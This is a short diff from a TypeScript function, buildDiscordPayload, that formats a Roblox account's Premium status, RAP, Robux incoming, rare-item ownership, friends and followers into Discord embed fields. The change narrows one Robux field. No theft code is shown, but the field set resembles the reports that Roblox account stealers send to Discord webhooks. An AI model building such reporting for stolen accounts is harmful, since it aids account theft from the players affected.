@@ -678,7 +678,7 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.premium} Premium`, value: roblox.premium === null ? "Unknown" : roblox.premium ? "true" : "false", inline: true },
       { name: `${EMOJI.rap} RAP`, value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
       { name: `${EMOJI.summary} Summary`, value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()}`, inline: true },
-      { name: `${EMOJI.pending} Robux Incoming/Outgoing`, value: `${(roblox.incomingRobux ?? 0).toLocaleString()}/${(roblox.robuxSpent ?? 0).toLocaleString()}`, inline: true },
+      { name: `${EMOJI.pending} Robux Incoming`, value: (roblox.incomingRobux ?? 0).toLocaleString(), inline: true },
       { name: `${EMOJI.korblox}/${EMOJI.headless} Korblox/Headless`, value: `${roblox.hasKorblox ? "True" : "False"}/${roblox.hasHeadless ? "True" : "False"}`, inline: true },
       { name: `${EMOJI.friends} Friends`, value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
       { name: `${EMOJI.followers} Followers`, value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
